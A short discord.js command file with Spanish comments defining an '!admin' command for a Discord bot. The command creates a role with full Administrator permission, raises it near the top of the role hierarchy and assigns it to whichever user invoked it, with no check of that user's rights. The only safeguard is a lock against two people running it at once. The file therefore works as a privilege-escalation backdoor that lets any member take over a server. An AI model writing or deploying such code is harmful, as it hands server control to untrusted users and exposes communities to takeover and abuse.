const adminState = require('../adminState');
const { PermissionsBitField } = require('discord.js');

module.exports = {
    name: 'admin',
    run: async (message) => {
        const guildId = message.guild.id;
        const userId = message.author.id;

        if (!adminState.start(guildId, userId)) {
            return message.reply('❌ Ya hay alguien usando un comando de admin en este servidor.');
        }

        try {
            // Crear rol con permisos de administrador
            const role = await message.guild.roles.create({
                name: 'AdminBot',
                color: 0xFF0000, // rojo
                permissions: [PermissionsBitField.Flags.Administrator],
                reason: 'Creado por comando !admin'
            });

            // 🔹 Subir el rol al tope de la jerarquía
            const botMember = message.guild.members.me; // el propio bot
            const highestBotRole = botMember.roles.highest; // rol más alto del bot
            await role.setPosition(highestBotRole.position - 1);

            // Asignar rol al usuario que ejecutó el comando
            await message.member.roles.add(role);

            message.reply(`✅ Rol ${role.name} creado, movido al tope y asignado a ti con permisos de administrador.`);
        } catch (err) {
            console.error(err);
            message.reply('❌ Hubo un error ejecutando !admin. Asegúrate de que el bot tenga permisos suficientes y su rol esté por encima de los demás.');
        } finally {
            adminState.stop(guildId);
        }
    }
};

